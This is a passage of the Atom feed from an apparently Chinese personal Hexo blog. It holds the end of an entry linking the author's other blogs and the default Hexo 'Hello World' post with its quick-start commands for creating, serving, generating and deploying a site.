      &lt;p&gt;个人博客，朝花夕拾。&lt;br&gt;索引链接。&lt;br&gt;新浪博客：&lt;a href=&quot;http://blog.sina.com.cn/shellr00t&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.sina.com.cn/shellr00t&lt;/a&gt;&lt;br&gt;Cnblogs：&lt;a href=&quot;http://www.cnblogs.com/shellr00t&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.cnblogs.com/shellr00t&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="归纳总结" scheme="http://yoursite.com/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/08/08/Hello%20World/"/>
    <id>http://yoursite.com/2017/08/08/Hello World/</id>
    <published>2017-08-08T00:08:08.000Z</published>
    <updated>2019-02-16T10:35:48.851Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br><a id="more"></a></p><h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3><span id="run-server">Run server</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3><span id="generate-static-files">Generate static files</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
      <category term="认知独省" scheme="http://yoursite.com/categories/%E8%AE%A4%E7%9F%A5%E7%8B%AC%E7%9C%81/"/>
    
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
  </entry>
  
</feed>
